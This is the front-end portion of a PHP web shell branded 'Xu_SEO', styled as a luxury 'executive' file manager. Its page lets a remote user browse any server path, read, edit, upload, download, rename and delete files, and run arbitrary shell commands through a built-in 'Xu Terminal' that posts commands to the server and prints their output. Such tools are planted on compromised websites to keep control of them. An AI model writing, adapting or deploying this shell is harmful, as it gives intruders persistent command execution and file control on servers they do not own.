                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        .notification.success {
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white;
        }

        .notification.error {
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
        }

        .notification.info {
            background: linear-gradient(135deg, var(--primary-gold), var(--secondary-gold));
            color: var(--dark-primary);
        }

        .close-btn {
            background: none;
            border: none;
            color: inherit;
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
            transform: scale(1.2);
        }

        .luxury-checkbox {
            accent-color: var(--primary-gold);
            transform: scale(1.2);
        }

        .file-size {
            font-family: 'Consolas', 'Monaco', monospace;
            font-weight: 600;
            color: var(--text-medium);
        }

        .file-date {
            font-family: 'Consolas', 'Monaco', monospace;
            color: var(--text-dim);
            font-size: 12px;
        }

        .file-perms {
            font-family: 'Consolas', 'Monaco', monospace;
            color: var(--primary-gold);
            font-weight: 600;
        }

        @media (max-width: 768px) {
            .Xu-container {
                padding: 10px;
            }
            
            .Xu-logo {
                font-size: 2.5rem;
            }
            
            .executive-info {
                flex-direction: column;
                text-align: center;
            }
            
            .control-row {
                flex-direction: column;
                align-items: stretch;
            }
            
            .luxury-input {
                min-width: auto;
                width: 100%;
            }
            
            .file-table th:nth-child(4),
            .file-table th:nth-child(5),
            .file-table td:nth-child(4),
            .file-table td:nth-child(5) {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="Xu-container">
        <div class="executive-header">
            <div class="Xu-logo">🔥Xu_SEO🔥</div>
            <div class="Xu-tagline">MAAF! SAYA MASIH DIBAWAH KKM 🤔</div>
            
            <div class="executive-info">
                <div class="user-profile">
                    <div class="user-avatar">
                        💰
                    </div>
                    <div class="user-details">
                        <h3><?= safe(ucfirst($current_user)) ?></h3>
                        <p><?= safe($user_title) ?></p>
                    </div>
                </div>
                
                <div class="session-stats">
                    <div class="stat-card">
                        <div class="stat-value"><?= $system_info['file_count'] ?></div>
                        <div class="stat-label">Files</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value"><?= $system_info['disk_free'] ?></div>
                        <div class="stat-label">Free Space</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value"><?= gmdate('H:i', $system_info['session_time']) ?></div>
                        <div class="stat-label">Session</div>
                    </div>
                </div>
                
                <a href="?logout" class="luxury-btn danger">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>

        <div class="executive-controls">
            <div class="control-row">
                <div class="control-group">
                    <i class="fas fa-folder-open" style="color: var(--primary-gold);"></i>
                    <input type="text" class="luxury-input" id="directoryInput" value="<?= safe($current_dir) ?>" placeholder="Enter directory path">
                    <button class="luxury-btn" onclick="navigateToDirectory()">
                        <i class="fas fa-arrow-right"></i> Navigate
                    </button>
                </div>
            </div>
            
            <div class="control-row">
                <button class="luxury-btn info" onclick="openTerminal()">
                    <i class="fas fa-terminal"></i> Terminal
                </button>
                <button class="luxury-btn success" onclick="openCreateModal()">
                    <i class="fas fa-plus"></i> Create
                </button>
                <input type="file" id="fileUpload" multiple style="display: none;" onchange="uploadFiles()">
                <button class="luxury-btn warning" onclick="document.getElementById('fileUpload').click()">
                    <i class="fas fa-upload"></i> Upload
                </button>
                <button class="luxury-btn danger" onclick="deleteSelected()">
                    <i class="fas fa-trash"></i> Delete Selected
                </button>
                <button class="luxury-btn" onclick="location.reload()">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
            </div>
        </div>

        <div class="breadcrumb-nav">
            <i class="fas fa-location-arrow"></i>
            <strong>Current Location:</strong>
            <?php
            $path_parts = explode('/', trim($current_dir, '/'));
            $current_path = '';
            echo '<a href="?">🏠 Root</a>';
            foreach ($path_parts as $part) {
                if (empty($part)) continue;
                $current_path .= '/' . $part;
                echo ' / <a href="?dir=' . urlencode($current_path) . '">' . safe($part) . '</a>';
            }
            ?>
        </div>

        <div class="file-explorer">
            <table class="file-table">
                <thead>
                    <tr>
                        <th width="40">
                            <input type="checkbox" class="luxury-checkbox" onclick="toggleAll(this)">
                        </th>
                        <th><i class="fas fa-file-alt"></i> Name</th>
                        <th width="100"><i class="fas fa-weight-hanging"></i> Size</th>
                        <th width="150"><i class="fas fa-clock"></i> Modified</th>
                        <th width="80"><i class="fas fa-shield-alt"></i> Perms</th>
                        <th width="200"><i class="fas fa-cogs"></i> Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    // Parent directory
                    if ($current_dir !== '/' && dirname($current_dir) !== $current_dir) {
                        $parent = dirname($current_dir);
                        echo '<tr>';
                        echo '<td></td>';
                        echo '<td><a href="?dir=' . urlencode($parent) . '" class="file-name directory">
                            <span class="file-icon">📁</span> ..</a></td>';
                        echo '<td class="file-size">-</td>';
                        echo '<td class="file-date">-</td>';
                        echo '<td class="file-perms">-</td>';
                        echo '<td>-</td>';
                        echo '</tr>';
                    }
                    
                    // Files and directories
                    foreach ($files as $file) {
                        if ($file === '.' || $file === '..') continue;
                        
                        $filepath = $current_dir . '/' . $file;
                        if (!is_readable($filepath)) continue;
                        
                        $is_dir = is_dir($filepath);
                        $size = $is_dir ? '<span style="color: var(--primary-gold);">DIR</span>' : formatBytes(filesize($filepath));
                        $modified = date('M d, Y H:i', filemtime($filepath));
                        $perms = substr(sprintf('%o', fileperms($filepath)), -4);
                        
                        echo '<tr>';
                        echo '<td><input type="checkbox" class="luxury-checkbox file-select" value="' . safe($file) . '"></td>';
                        echo '<td>';
                        
                        if ($is_dir) {
                            echo '<a href="?dir=' . urlencode($filepath) . '" class="file-name directory">
                                <span class="file-icon">📁</span> ' . safe($file) . '</a>';
                        } else {
                            $icon = getFileIcon($file);
                            echo '<a href="#" onclick="editFile(\'' . safe($file) . '\')" class="file-name">
                                <span class="file-icon">' . $icon . '</span> ' . safe($file) . '</a>';
                        }
                        
                        echo '</td>';
                        echo '<td class="file-size">' . $size . '</td>';
                        echo '<td class="file-date">' . $modified . '</td>';
                        echo '<td class="file-perms">' . $perms . '</td>';
                        echo '<td><div class="file-actions">';
                        
                        if (!$is_dir) {
                            echo '<a href="#" onclick="editFile(\'' . safe($file) . '\')" class="action-btn action-edit">
                                <i class="fas fa-edit"></i> Edit</a>';
                            echo '<a href="?download=' . urlencode($file) . '" class="action-btn action-download">
                                <i class="fas fa-download"></i> Download</a>';
                        }
                        
                        echo '<a href="#" onclick="renameFile(\'' . safe($file) . '\')" class="action-btn action-rename">
                            <i class="fas fa-pen"></i> Rename</a>';
                        echo '<a href="#" onclick="deleteFile(\'' . safe($file) . '\')" class="action-btn action-delete">
                            <i class="fas fa-trash"></i> Delete</a>';
                        echo '</div></td>';
                        echo '</tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Edit Modal -->
    <div id="editModal" class="executive-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="editTitle"><i class="fas fa-edit"></i> Edit File</h3>
                <button class="close-btn" onclick="closeModal('editModal')">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <textarea id="editContent" class="luxury-editor" placeholder="File content will appear here..."></textarea>
            </div>
            <div class="modal-footer">
                <button class="luxury-btn success" onclick="saveFile()">
                    <i class="fas fa-save"></i> Save Changes
                </button>
                <button class="luxury-btn" onclick="closeModal('editModal')">
                    <i class="fas fa-times"></i> Cancel
                </button>
            </div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div id="terminalModal" class="executive-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-terminal"></i> Xu Terminal</h3>
                <button class="close-btn" onclick="closeModal('terminalModal')">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="executive-terminal" id="terminalOutput">
                    <div style="color: var(--secondary-gold); font-weight: bold; margin-bottom: 15px;">
                    ╔══════════════════════════════════════════════════════════════╗
                    ║                      💰 Xu TERMINAL 💰                    ║
                    ║                   Executive Command Center                   ║
                    ╚══════════════════════════════════════════════════════════════╝
                    </div>
                    <div style="color: var(--text-light); margin-bottom: 15px;">
                    🌐 System: <?= safe($system_info['os']) ?><br>
                    🔧 PHP: <?= safe($system_info['php']) ?><br>
                    👤 User: <?= safe($current_user) ?><br>
                    📁 Location: <?= safe($current_dir) ?><br>
                    ══════════════════════════════════════════════════════════════<br>
                    Xu terminal ready. Type 'help' for available commands.<br><br>
                    </div>
                </div>
                <div class="terminal-input">
                    <span class="terminal-prompt">Xu@<?= safe($current_user) ?>:~$</span>
                    <input type="text" class="terminal-cmd" id="terminalInput" onkeydown="handleTerminalInput(event)" placeholder="Enter command...">
                </div>
            </div>
            <div class="modal-footer">
                <button class="luxury-btn warning" onclick="clearTerminal()">
                    <i class="fas fa-broom"></i> Clear
                </button>
                <button class="luxury-btn info" onclick="showTerminalHelp()">
                    <i class="fas fa-question-circle"></i> Help
                </button>
                <button class="luxury-btn" onclick="closeModal('terminalModal')">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>
    </div>

    <!-- Create Modal -->
    <div id="createModal" class="executive-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-plus-circle"></i> Create New Item</h3>
                <button class="close-btn" onclick="closeModal('createModal')">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin-bottom: 30px;">
                    <button class="luxury-btn success" onclick="showCreateFile()" style="margin-right: 15px;">
                        <i class="fas fa-file-plus"></i> Create File
                    </button>
                    <button class="luxury-btn info" onclick="showCreateFolder()">
                        <i class="fas fa-folder-plus"></i> Create Folder
                    </button>
                </div>
                
                <div id="createFileForm" style="display: none;">
                    <label style="display: block; margin-bottom: 10px; font-weight: 600; color: var(--text-light);">
                        <i class="fas fa-file"></i> File Name:
                    </label>
                    <input type="text" id="fileName" class="luxury-input" placeholder="example.txt" style="width: 100%; margin-bottom: 20px;">
                    <button class="luxury-btn success" onclick="createFile()" style="width: 100%;">
                        <i class="fas fa-plus"></i> Create File
                    </button>
                </div>
                
                <div id="createFolderForm" style="display: none;">
                    <label style="display: block; margin-bottom: 10px; font-weight: 600; color: var(--text-light);">
                        <i class="fas fa-folder"></i> Folder Name:
                    </label>
                    <input type="text" id="folderName" class="luxury-input" placeholder="new-folder" style="width: 100%; margin-bottom: 20px;">
                    <button class="luxury-btn info" onclick="createFolder()" style="width: 100%;">
                        <i class="fas fa-plus"></i> Create Folder
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentFile = '';

        // Notification system
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-triangle' : 'info-circle'}"></i> ${message}`;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 5000);
        }

        // Modal functions
        function showModal(modalId) {
            document.getElementById(modalId).style.display = 'block';
        }

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        // Directory navigation
        function navigateToDirectory() {
            const dir = document.getElementById('directoryInput').value.trim();
            if (dir) {
                showNotification('Navigating to directory...', 'info');
                window.location.href = '?dir=' + encodeURIComponent(dir);
            }
        }

        // File operations
        function editFile(filename) {
            currentFile = filename;
            showNotification('Loading file content...', 'info');
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=edit_file&file=' + encodeURIComponent(filename)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('editContent').value = data.content;
                    document.getElementById('editTitle').innerHTML = `<i class="fas fa-edit"></i> Editing: ${filename}`;
                    showModal('editModal');
                    showNotification('File loaded successfully', 'success');
                } else {
                    showNotification('Error: ' + data.error, 'error');
                }
            })
            .catch(error => {
                showNotification('Network error occurred', 'error');
            });
        }

        function saveFile() {
            const content = document.getElementById('editContent').value;
            showNotification('Saving file...', 'info');
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=save_file&file=' + encodeURIComponent(currentFile) + '&content=' + encodeURIComponent(content)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification('File saved successfully', 'success');
                    closeModal('editModal');
                } else {
                    showNotification('Error: ' + data.error, 'error');
                }
            })
            .catch(error => {
                showNotification('Network error occurred', 'error');
            });
        }

        function deleteFile(filename) {
            if (confirm(`Are you sure you want to delete "${filename}"?`)) {
                showNotification('Deleting file...', 'info');
                
                fetch('', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'action=delete&target=' + encodeURIComponent(filename)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showNotification('File deleted successfully', 'success');
                        setTimeout(() => location.reload(), 1000);
                    } else {
                        showNotification('Failed to delete file', 'error');
                    }
                })
                .catch(error => {
                    showNotification('Network error occurred', 'error');
                });
            }
        }

        function renameFile(filename) {
            const newName = prompt(`Enter new name for "${filename}":`, filename);
            if (newName && newName !== filename) {
                showNotification('Renaming file...', 'info');
                
                fetch('', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'action=rename&old_name=' + encodeURIComponent(filename) + '&new_name=' + encodeURIComponent(newName)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showNotification('File renamed successfully', 'success');
                        setTimeout(() => location.reload(), 1000);
                    } else {
                        showNotification('Failed to rename file', 'error');
                    }
                })
                .catch(error => {
                    showNotification('Network error occurred', 'error');
                });
            }
        }

        function uploadFiles() {
            const fileInput = document.getElementById('fileUpload');
            if (!fileInput.files.length) return;
            
            showNotification(`Uploading ${fileInput.files.length} file(s)...`, 'info');
            
            const formData = new FormData();
            for (let i = 0; i < fileInput.files.length; i++) {
                formData.append('files[]', fileInput.files[i]);
            }
            formData.append('action', 'upload');
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification(`${data.uploaded}/${data.total} files uploaded successfully`, 'success');
                    setTimeout(() => location.reload(), 1500);
                } else {
                    showNotification('Upload failed', 'error');
                }
                fileInput.value = '';
            })
            .catch(error => {
                showNotification('Network error occurred', 'error');
            });
        }

        function deleteSelected() {
            const selected = Array.from(document.querySelectorAll('.file-select:checked')).map(cb => cb.value);
            if (selected.length === 0) {
                showNotification('No files selected', 'info');
                return;
            }
            
            if (confirm(`Are you sure you want to delete ${selected.length} selected item(s)?`)) {
                showNotification(`Deleting ${selected.length} item(s)...`, 'info');
                
                let deleteCount = 0;
                selected.forEach(file => {
                    fetch('', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'action=delete&target=' + encodeURIComponent(file)
                    })
                    .then(() => {
                        deleteCount++;
                        if (deleteCount === selected.length) {
                            showNotification('All selected items deleted', 'success');
                            setTimeout(() => location.reload(), 1000);
                        }
                    });
                });
            }
        }

        function toggleAll(source) {
            const checkboxes = document.querySelectorAll('.file-select');
            checkboxes.forEach(cb => cb.checked = source.checked);
        }

        // Terminal functions
        function openTerminal() {
            showModal('terminalModal');
            setTimeout(() => {
                document.getElementById('terminalInput').focus();
            }, 100);
        }

        function handleTerminalInput(event) {
            if (event.key === 'Enter') {
                const input = event.target;
                const command = input.value.trim();
                
                if (command) {
                    addToTerminal(`<span style="color: var(--secondary-gold);">Xu@<?= safe($current_user) ?>:~$</span> <span style="color: var(--text-light);">${command}</span>`);
                    executeCommand(command);
                    input.value = '';
                }
            }
        }

        function executeCommand(command) {
            if (command === 'clear') {
                clearTerminal();
                return;
            }
            
            if (command === 'help') {
                showTerminalHelp();
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=terminal&command=' + encodeURIComponent(command)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    addToTerminal(`<span style="color: var(--text-light);">${data.output}</span>`);
                } else {
                    addToTerminal(`<span style="color: #ff6b6b;">ERROR: ${data.error}</span>`);
                }
            })
            .catch(error => {
                addToTerminal(`<span style="color: #ff6b6b;">Network error occurred</span>`);
            });
        }

        function addToTerminal(html) {
            const output = document.getElementById('terminalOutput');
            output.innerHTML += html + '<br>';
            output.scrollTop = output.scrollHeight;
        }

        function clearTerminal() {
            document.getElementById('terminalOutput').innerHTML = `
                <div style="color: var(--secondary-gold); font-weight: bold; margin-bottom: 15px;">
                ╔══════════════════════════════════════════════════════════════╗
                ║                      💰 Xu TERMINAL 💰                    ║
                ║                   Executive Command Center                   ║
                ╚══════════════════════════════════════════════════════════════╝
                </div>
                <div style="color: var(--text-light); margin-bottom: 15px;">
                🌐 System: <?= safe($system_info['os']) ?><br>
                🔧 PHP: <?= safe($system_info['php']) ?><br>
                👤 User: <?= safe($current_user) ?><br>
                📁 Location: <?= safe($current_dir) ?><br>
                ══════════════════════════════════════════════════════════════<br>
                Xu terminal ready. Type 'help' for available commands.<br><br>
                </div>
            `;
        }

        function showTerminalHelp() {
            addToTerminal(`
                <div style="color: var(--secondary-gold); font-weight: bold;">💰 Xu TERMINAL COMMANDS 💰</div>
                <div style="color: var(--text-light); margin-top: 10px;">
                ══════════════════════════════════════════════════════════════<br>
                <span style="color: var(--primary-gold);">NAVIGATION:</span><br>
                • ls, dir          - List directory contents<br>
                • pwd              - Show current directory<br>
                • cd [directory]   - Change directory<br>
                • clear            - Clear terminal<br><br>
                <span style="color: var(--primary-gold);">FILE OPERATIONS:</span><br>
                • cat [file]       - Display file contents<br>
                • mkdir [name]     - Create directory<br>
                • touch [file]     - Create empty file<br>
                • cp [src] [dest]  - Copy file<br>
                • mv [src] [dest]  - Move/rename file<br>
                • rm [file]        - Delete file<br><br>
                <span style="color: var(--primary-gold);">SYSTEM INFO:</span><br>
                • ps               - Show running processes<br>
                • df -h            - Show disk usage<br>
                • free -h          - Show memory usage<br>
                • uname -a         - Show system information<br>
                • whoami           - Show current user<br>
                ══════════════════════════════════════════════════════════════
                </div>
            `);
        }

        // Create functions
        function openCreateModal() {
            showModal('createModal');
        }

        function showCreateFile() {
            document.getElementById('createFileForm').style.display = 'block';
            document.getElementById('createFolderForm').style.display = 'none';
            setTimeout(() => document.getElementById('fileName').focus(), 100);
        }

        function showCreateFolder() {
            document.getElementById('createFolderForm').style.display = 'block';
            document.getElementById('createFileForm').style.display = 'none';
            setTimeout(() => document.getElementById('folderName').focus(), 100);
        }

        function createFile() {
            const filename = document.getElementById('fileName').value.trim();
            if (!filename) {
                showNotification('Please enter a file name', 'error');
                return;
            }
            
            showNotification('Creating file...', 'info');
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=create_file&filename=' + encodeURIComponent(filename)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification('File created successfully', 'success');
                    closeModal('createModal');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showNotification('Failed to create file', 'error');
                }
            })
            .catch(error => {
                showNotification('Network error occurred', 'error');
            });
        }

        function createFolder() {
            const foldername = document.getElementById('folderName').value.trim();
            if (!foldername) {
                showNotification('Please enter a folder name', 'error');
                return;
            }
            
            showNotification('Creating folder...', 'info');
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=create_folder&folder_name=' + encodeURIComponent(foldername)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification('Folder created successfully', 'success');
                    closeModal('createModal');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showNotification('Failed to create folder', 'error');
                }
            })
            .catch(error => {
                showNotification('Network error occurred', 'error');
            });
        }

        // Event listeners
        window.onclick = function(event) {
            if (event.target.classList.contains('executive-modal')) {
                closeModal(event.target.id);
            }
        }

        document.getElementById('directoryInput').addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                navigateToDirectory();
            }
        });

        // File drag and drop
        document.addEventListener('dragover', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });

        document.addEventListener('drop', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                const fileInput = document.getElementById('fileUpload');
                fileInput.files = files;
                uploadFiles();
            }
        });

        // Welcome message
        document.addEventListener('DOMContentLoaded', function() {
            showNotification('Welcome to Xu File Manager, ' + '<?= safe(ucfirst($current_user)) ?>' + '!', 'success');
        });
    </script>
</body>
</html>